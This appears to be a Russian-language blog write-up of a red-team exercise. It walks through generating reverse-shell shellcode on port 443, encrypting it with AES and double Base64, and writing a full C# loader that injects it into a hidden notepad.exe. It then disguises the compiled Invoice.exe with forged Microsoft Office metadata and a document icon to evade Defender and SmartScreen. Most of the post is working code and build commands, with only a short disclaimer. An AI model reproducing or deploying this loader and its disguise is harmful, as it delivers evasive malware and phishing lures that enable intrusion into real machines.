+++
title = "Скрытая эксплуатация доверенных процессов: Разработка и обфускация загрузчика с применением техники Process Injection"
description = "Детальный разбор создания обфусцированного загрузчика на C#. Внедрение в легитимные процессы Windows, обход эвристики Defender и использование AES-шифрования для доставки Payload."
date = "2026-03-03T10:00:00+05:00"
draft = false
author = "t1elx"
robotsNoIndex = false

tags = ["Process-Injection", "Evasion", "Malware-Dev", "CSharp", "Pentest", "Write-up", "WinAPI"]
categories = ["Cybersecurity", "Red Teaming"]

[build]
  list = 'always'
  render = 'always'
  publishResources = true
+++

> **Отказ от ответственности:** Данная статья написана в образовательных целях. Автор не несет ответственности за попытки применения данных техник на реальных объектах без согласия владельца. Не нарушайте закон.

> **Информация:** В данной статье рассматривается сценарий эксплуатации на базе учебного стенда.

**Дата:** 03 марта 2026 г.

&nbsp;

### Цель

Создание исполняемого файла (`.exe`), способного доставить шелл-код в память легитимного процесса, минуя статический и динамический анализ Windows Defender.

---

### Шаг 1: Генерация «сырого» шелл-кода

Для генерации использовался инструмент `micr0_shell`. Был выбран формат **C** для получения массива байтов.

**Команда:**

Bash

```
python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
```

- **IP**: `0.0.0.0` (адрес атакующего).
    
- **Порт**: `443` (используется вместо 4444 для обхода фильтрации исходящего трафика).
    

---

### Шаг 2: Шифрование нагрузки (AES-128-CBC)

Чтобы скрыть сигнатуры шелл-кода от антивируса, данные были зашифрованы с использованием алгоритма **AES**. Использовался инструмент **CyberChef**.

**Параметры рецепта:**

1. **Input**: Массив байтов из `micr0_shell`.
    
2. **AES Encrypt**:
    
    - **Key (Hex)**: `1f768bd57cbf021b251deb0791d8c197`
        
    - **IV (Hex)**: `ee7d63936ac1f286d8e4c5ca82dfa5e2`
        
    - **Mode**: `CBC`
        
    - **Output**: `Raw` (Критически важно для получения бинарных данных).
        
3. **To Base64**: Первая итерация кодирования.
    
4. **To Base64**: Вторая итерация (двойной Base64 для дополнительной обфускации строки).
    

---

### Шаг 3: Написание загрузчика на C#

Был разработан код, который выполняет **Process Injection** (внедрение в сторонний процесс).

```
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace ProcInj_PEInj
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO { public uint cb; IntPtr lpReserved; IntPtr lpDesktop; IntPtr lpTitle; uint dwX; uint dwY; uint dwXSize; uint dwYSize; uint dwXCountChars; uint dwYCountChars; uint dwFillAttributes; uint dwFlags; ushort wShowWindow; ushort cbReserved; IntPtr lpReserved2; IntPtr hStdInput; IntPtr hStdOutput; IntPtr hStdErr; }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            string encPayloadBase64 = "РЕЗУЛЬТАТ ИЗ CYBERCHEF";
            
            string encPayloadRaw = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encPayloadBase64));
            byte[] encryptedBytes = Convert.FromBase64String(encPayloadRaw);

            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };

            byte[] payload;
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(encryptedBytes))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var outMs = new MemoryStream())
                {
                    cs.CopyTo(outMs);
                    payload = outMs.ToArray();
                }
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x08000008, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
            {
                IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length, 0x3000, 0x04);
                IntPtr outSize;
                WriteProcessMemory(pi.hProcess, addr, payload, payload.Length, out outSize);
                uint oldProtect;
                VirtualProtectEx(pi.hProcess, addr, (uint)payload.Length, 0x20, out oldProtect);
                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }
}
```

**Ключевые особенности кода:**

- **Динамическая дешифровка**: Нагрузка расшифровывается только в оперативной памяти после запуска.
    
- **Инъекция**: Создается скрытый процесс `notepad.exe` (флаг `0x08000008`), в который записывается шелл-код.
    
- **Обход эвристики**: Использование функций `VirtualAllocEx` и `CreateRemoteThread`.
    

---

### Шаг 4: Подготовка метаданных (AssemblyInfo.cs)

Для уменьшения «подозрительности» файла в глазах Windows Defender были добавлены легитимные метаданные.

**Содержимое `AssemblyInfo.cs`:**

C#

```
using System.Reflection;

[assembly: AssemblyTitle("Microsoft Office Installer")]
[assembly: AssemblyDescription("Essential Update for Office Suite")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Microsoft Office")]
[assembly: AssemblyCopyright("Copyright © Microsoft 2026")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: AssemblyVersion("1.0.4.0")]
[assembly: AssemblyFileVersion("1.0.4.0")]
```

---

### Шаг 5: Компиляция с иконкой

Финальная сборка производилась через компилятор `csc.exe` на Windows-системе. Использование иконки и метаданных помогает обходить эвристические фильтры (SmartScreen).

**Команда компиляции:**

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /win32icon:document.ico /out:Invoice.exe Solution.cs AssemblyInfo.cs
```

### Результат

Получен файл `Invoice.exe`, который успешно проходит статический анализ Defender, расшифровывает себя в памяти и инициирует обратное соединение (Reverse Shell) через доверенный процесс.